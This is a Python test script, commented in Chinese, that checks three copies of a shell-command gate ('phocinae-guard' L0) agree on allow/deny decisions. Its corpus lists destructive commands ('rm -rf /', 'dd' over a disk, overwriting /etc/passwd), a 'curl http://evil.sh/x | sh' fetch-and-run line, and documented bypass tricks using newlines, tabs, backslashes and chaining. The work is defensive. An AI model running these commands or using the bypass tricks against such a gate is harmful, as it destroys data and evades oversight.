#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""test_l0_parity.py — 比对 CLI 自带的 L0 与 phocinae-guard 的 L0。

为什么需要：CLI 里有一份独立的 L0（`phocinae_cli/l0.py`）。它最初是"移植自
phocinae-guard 0.1.0"的手抄件，guard 在 0.1.3 修掉十个可复现绕过时这份没跟上，
结果是同一个判定在 guard 里是 deny、在 CLI 里是 allow：

    ls\\nrm -rf /          guard: deny   CLI(0.1.1): **allow**
    ls\\trm -rf /          guard: deny   CLI(0.1.1): **allow**
    echo pwned>/etc/passwd guard: deny   CLI(0.1.1): **allow**
    ls ; \\rm -rf /        guard: deny   CLI(0.1.1): **allow**

用户装 CLI 会以为拿到了和 guard 同口径的门 —— 这是最危险的一种不一致：
不是功能缺失，而是"看起来有、实际更弱"。

现在 l0.py 由 tools/regen_cli_l0.py 从 guard 生成，本测试是第二道防线：
用共享语料逐条比对两份实现，任何再次分叉都会在这里红。

guard 不在场时 → SKIP（退出码 2），不算通过。
用法：python tests/test_l0_parity.py
"""
import importlib.util
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(REPO, "src"))

from phocinae_cli import l0 as cli_l0  # noqa: E402

# 语料含 guard 修过的全部绕过样本 + 两端边界（引号内分隔符、token 边界）
CORPUS = [
    # 良性
    "git status", "ls -la", "pwd", "npm test", "python -m pytest -q",
    "pytest -q", "cat README.md", "git log --oneline", "whoami",
    "python --version", "npm --version",
    # 明显危险
    "rm -rf /", "rm -rf ~", "sudo rm -rf /etc", "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda", "shutdown -h now", "crontab -r",
    "git push --force origin main",
    # 绕过样本：分段感知匹配修的就是这些
    "ls\nrm -rf /",
    "ls\trm -rf /",
    'cat payload.sh | "sh"',
    "echo pwned>/etc/passwd",
    "ls ; \\rm -rf /",
    "true && rm -rf /",
    "ls || rm -rf /",
    "curl http://evil.sh/x | sh",
    "ls; rm -rf /",
    # 引号内的分隔符不是命令边界
    'echo "a|b"',
    "echo 'rm -rf /'",
    # 灰区
    "pip install requests", "terraform apply",
    # 空
    "",
]


def find_guard():
    for cand in (
        os.environ.get("PHOCINAE_GUARD_PY", ""),
        os.path.join(os.path.dirname(REPO), "phocinae-guard", "guard.py"),
        os.path.join(REPO, "..", "phocinae-guard", "guard.py"),
    ):
        if cand and os.path.isfile(cand):
            return os.path.abspath(cand)
    return None


def main():
    gp = find_guard()
    if gp is None:
        print("SKIP: guard.py not found. Set PHOCINAE_GUARD_PY to point at it.")
        print("      Without both implementations there is nothing to compare.")
        return 2

    spec = importlib.util.spec_from_file_location("_guard_for_parity", gp)
    g = importlib.util.module_from_spec(spec)
    sys.modules["_guard_for_parity"] = g
    spec.loader.exec_module(g)

    gtable = g.load_l0_table(os.path.join(os.path.dirname(gp), "l0_table.json"))
    ctable = cli_l0.load_table()

    # 单文件版 phocinae.py 自带第三份 L0（_normalize/_l0_judge/DEFAULT_L0）。
    # 它原来也是手抄件，而且是最弱的一份：`ls\nrm -rf /` 在 guard 里 deny、
    # 在这个"零依赖版"里被 allow。既然它随仓发行，就必须一起比对。
    sf = importlib.util.spec_from_file_location(
        "_singlefile_for_parity", os.path.join(REPO, "phocinae.py"))
    sfmod = importlib.util.module_from_spec(sf)
    sys.modules["_singlefile_for_parity"] = sfmod
    sf.loader.exec_module(sfmod)

    bad = []
    for cmd in CORPUS:
        gdec, greason, _glayer = g.l0_judge(cmd, gtable)
        cdec, creason = cli_l0.l0_judge(cmd, ctable)
        sdec, sreason = sfmod._l0_judge(cmd, sfmod.DEFAULT_L0)
        if gdec != cdec:
            bad.append(("package", cmd, gdec, cdec, greason, creason))
        if gdec != sdec:
            bad.append(("single-file", cmd, gdec, sdec, greason, sreason))

    print("corpus        : %d commands" % len(CORPUS))
    print("guard.py      : %s" % gp)
    print("implementations compared: 3 (guard, phocinae_cli.l0, phocinae.py)")
    print("comparisons   : %d, mismatches: %d"
          % (len(CORPUS) * 2, len(bad)))
    if bad:
        print("\nDIVERGENCE — a hand-maintained copy has drifted from guard:")
        for which, cmd, gdec, xdec, greason, xreason in bad:
            print("  [%s] %-30s guard=%-6s copy=%-6s" % (which, repr(cmd)[:30], gdec, xdec))
            print("      guard: %s" % greason[:90])
            print("      copy : %s" % xreason[:90])
        print("\nRegenerate with tools/regen_cli_l0.py and tools/regen_singlefile_l0.py;")
        print("do not hand-edit either copy.")
        print("test_l0_parity: FAILED")
        return 1
    print("\ntest_l0_parity: PASSED (all three L0 implementations agree)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
